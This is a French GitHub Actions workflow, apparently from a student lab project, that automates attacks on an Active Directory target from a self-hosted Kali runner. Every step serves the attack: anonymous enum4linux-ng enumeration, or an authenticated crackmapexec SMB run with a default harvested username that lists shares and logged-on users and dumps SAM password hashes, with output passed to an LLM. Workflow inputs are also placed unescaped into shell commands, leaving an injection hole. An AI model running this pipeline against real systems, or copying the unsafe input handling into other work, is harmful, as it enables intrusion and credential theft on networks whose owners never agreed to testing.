name: "AD Offensive Platform - Choix du Scan"

on:
  workflow_dispatch:
    inputs:
      scan_type:
        description: 'Stratégie de scan'
        required: true
        default: 'anonyme'
        type: choice
        options:
          - anonyme
          - authentifie
      target_ip:
        description: 'IP cible'
        required: true
        default: '192.168.159.100'
      # Nouveaux champs pour le chaining automatique
      username:
        description: 'Utilisateur pour scan authentifié'
        required: false
        default: ''
      password:
        description: 'Mot de passe pour scan authentifié'
        required: false
        default: ''

jobs:
  offensive_task:
    runs-on: [self-hosted, kali]
    steps:
      - name: 1. Vérification réseau
        run: ping -c 2 ${{ github.event.inputs.target_ip }}

      # --- SCÉNARIO A : SCAN ANONYME ---
      - name: Lancer Scan Anonyme (Nmap + Enum4linux-ng basic)
        if: ${{ github.event.inputs.scan_type == 'anonyme' }}
        run: |
          # On génère un format JSON pour que Llama puisse le lire facilement
          enum4linux-ng -A ${{ github.event.inputs.target_ip }} > ad_report.json || true

      # --- SCÉNARIO B : SCAN AUTHENTIFIÉ (CHAINING) ---
      - name: Lancer Scan Authentifié (CrackMapExec / NetExec)
        if: ${{ github.event.inputs.scan_type == 'authentifie' }}
        run: |
          # On utilise les credentials envoyés par le script Python
          # Si username est vide, on utilise 'support.it' par défaut (celui trouvé dans ton log)
          USER="${{ github.event.inputs.username }}"
          if [ -z "$USER" ]; then USER="support.it"; fi
          
          PASS="${{ github.event.inputs.password }}"
          
          echo "🔥 Lancement de l'exploitation authentifiée avec l'utilisateur: $USER"
          
          # CrackMapExec est plus puissant pour montrer l'exploitation au jury
          crackmapexec smb ${{ github.event.inputs.target_ip }} -u "$USER" -p "$PASS" --shares --sam --loggedon-users > ad_report.json || true

      - name: Archivage du rapport
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rapport-ad
          path: ad_report.json
